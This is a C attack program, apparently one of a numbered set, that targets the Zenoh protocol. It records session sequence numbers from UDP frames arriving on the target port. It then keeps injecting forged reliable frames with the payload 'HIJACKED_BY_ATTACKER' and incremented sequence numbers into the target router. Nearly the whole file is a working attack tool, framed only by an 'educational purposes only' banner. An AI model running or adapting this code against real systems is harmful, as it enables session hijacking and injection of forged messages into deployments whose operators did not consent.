/*
 * Attack 4: Session Hijacking
 * Sniffs sessions and injects malicious frames
 * 
 * Compile: gcc -o attack4_hijack attack_4_session_hijack.c -pthread
 * Run: sudo ./attack4_hijack <target_ip> <target_port>
 * Note: Requires root for packet sniffing
 * 
 * WARNING: FOR EDUCATIONAL PURPOSES ONLY
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <signal.h>
#include <time.h>

#define MAX_SESSIONS 100
#define Z_MSG_FRAME 0x00
#define Z_FLAG_RELIABLE 0x20

static volatile int g_running = 1;

typedef struct {
    struct sockaddr_in addr;
    unsigned long long seq_num;
    time_t last_seen;
    int active;
} session_t;

typedef struct {
    char *target_ip;
    int target_port;
    session_t sessions[MAX_SESSIONS];
    int session_count;
    pthread_mutex_t mutex;
} hijack_ctx_t;

void signal_handler(int sig) {
    printf("\n[!] Stopping hijack attack...\n");
    g_running = 0;
}

size_t encode_zint(unsigned char *buf, unsigned long long value) {
    size_t i = 0;
    while (value > 0x7F) {
        buf[i++] = (unsigned char)((value & 0x7F) | 0x80);
        value >>= 7;
    }
    buf[i++] = (unsigned char)(value & 0x7F);
    return i;
}

size_t decode_zint(const unsigned char *buf, size_t len, unsigned long long *value) {
    *value = 0;
    size_t i = 0;
    int shift = 0;
    
    while (i < len) {
        unsigned char byte = buf[i++];
        *value |= ((unsigned long long)(byte & 0x7F)) << shift;
        shift += 7;
        if ((byte & 0x80) == 0) return i;
    }
    return 0;
}

session_t* find_or_create_session(hijack_ctx_t *ctx, struct sockaddr_in *addr, 
                                  unsigned long long seq) {
    pthread_mutex_lock(&ctx->mutex);
    
    for (int i = 0; i < ctx->session_count; i++) {
        if (ctx->sessions[i].active &&
            ctx->sessions[i].addr.sin_addr.s_addr == addr->sin_addr.s_addr &&
            ctx->sessions[i].addr.sin_port == addr->sin_port) {
            ctx->sessions[i].seq_num = seq;
            ctx->sessions[i].last_seen = time(NULL);
            pthread_mutex_unlock(&ctx->mutex);
            return &ctx->sessions[i];
        }
    }
    
    if (ctx->session_count < MAX_SESSIONS) {
        session_t *session = &ctx->sessions[ctx->session_count++];
        session->addr = *addr;
        session->seq_num = seq;
        session->last_seen = time(NULL);
        session->active = 1;
        
        printf("[+] New session: %s:%d (seq=%llu)\n",
               inet_ntoa(addr->sin_addr), ntohs(addr->sin_port), seq);
        
        pthread_mutex_unlock(&ctx->mutex);
        return session;
    }
    
    pthread_mutex_unlock(&ctx->mutex);
    return NULL;
}

void* sniffer_thread(void *arg) {
    hijack_ctx_t *ctx = (hijack_ctx_t*)arg;
    int sock;
    unsigned char buffer[4096];
    struct sockaddr_in src_addr;
    socklen_t addr_len = sizeof(src_addr);
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("[-] Sniffer socket failed");
        return NULL;
    }
    
    struct sockaddr_in bind_addr = {0};
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_addr.s_addr = INADDR_ANY;
    bind_addr.sin_port = htons(ctx->target_port);
    
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    if (bind(sock, (struct sockaddr*)&bind_addr, sizeof(bind_addr)) < 0) {
        perror("[-] Bind failed (need root?)");
        close(sock);
        return NULL;
    }
    
    printf("[+] Sniffer started on port %d\n", ctx->target_port);
    
    while (g_running) {
        ssize_t len = recvfrom(sock, buffer, sizeof(buffer), 0,
                              (struct sockaddr*)&src_addr, &addr_len);
        
        if (len <= 0) continue;
        
        if ((buffer[0] & 0x1F) == Z_MSG_FRAME) {
            unsigned long long seq;
            if (decode_zint(buffer + 1, len - 1, &seq) > 0) {
                find_or_create_session(ctx, &src_addr, seq);
            }
        }
    }
    
    close(sock);
    printf("[*] Sniffer stopped\n");
    return NULL;
}

void* injector_thread(void *arg) {
    hijack_ctx_t *ctx = (hijack_ctx_t*)arg;
    int sock;
    unsigned char buffer[1024];
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("[-] Injector socket failed");
        return NULL;
    }
    
    struct sockaddr_in router_addr = {0};
    router_addr.sin_family = AF_INET;
    router_addr.sin_port = htons(ctx->target_port);
    inet_pton(AF_INET, ctx->target_ip, &router_addr.sin_addr);
    
    printf("[+] Injector started\n");
    
    sleep(5); // Wait for sessions
    
    while (g_running) {
        pthread_mutex_lock(&ctx->mutex);
        
        for (int i = 0; i < ctx->session_count; i++) {
            if (!ctx->sessions[i].active) continue;
            
            session_t *session = &ctx->sessions[i];
            session->seq_num++;
            
            size_t offset = 0;
            buffer[offset++] = Z_MSG_FRAME | Z_FLAG_RELIABLE;
            offset += encode_zint(buffer + offset, session->seq_num);
            
            const char *payload = "HIJACKED_BY_ATTACKER";
            memcpy(buffer + offset, payload, strlen(payload));
            offset += strlen(payload);
            
            sendto(sock, buffer, offset, 0,
                  (struct sockaddr*)&router_addr, sizeof(router_addr));
            
            printf("[!] Injected frame to %s:%d (seq=%llu)\n",
                   inet_ntoa(session->addr.sin_addr),
                   ntohs(session->addr.sin_port),
                   session->seq_num);
        }
        
        pthread_mutex_unlock(&ctx->mutex);
        sleep(2);
    }
    
    close(sock);
    printf("[*] Injector stopped\n");
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: sudo %s <target_ip> <target_port>\n", argv[0]);
        fprintf(stderr, "Example: sudo %s 127.0.0.1 7447\n", argv[0]);
        return 1;
    }
    
    if (geteuid() != 0) {
        fprintf(stderr, "[-] This attack requires root privileges\n");
        return 1;
    }
    
    hijack_ctx_t ctx = {0};
    ctx.target_ip = argv[1];
    ctx.target_port = atoi(argv[2]);
    pthread_mutex_init(&ctx.mutex, NULL);
    
    printf("╔════════════════════════════════════════════╗\n");
    printf("║   Zenoh Session Hijacking Attack           ║\n");
    printf("║   WARNING: EDUCATIONAL PURPOSES ONLY       ║\n");
    printf("╚════════════════════════════════════════════╝\n\n");
    printf("[*] Target: %s:%d\n", ctx.target_ip, ctx.target_port);
    printf("[*] Mode: Sniff + Inject\n\n");
    
    signal(SIGINT, signal_handler);
    
    pthread_t sniffer, injector;
    pthread_create(&sniffer, NULL, sniffer_thread, &ctx);
    pthread_create(&injector, NULL, injector_thread, &ctx);
    
    pthread_join(sniffer, NULL);
    pthread_join(injector, NULL);
    
    pthread_mutex_destroy(&ctx.mutex);
    
    printf("\n[*] Attack stopped\n");
    return 0;
}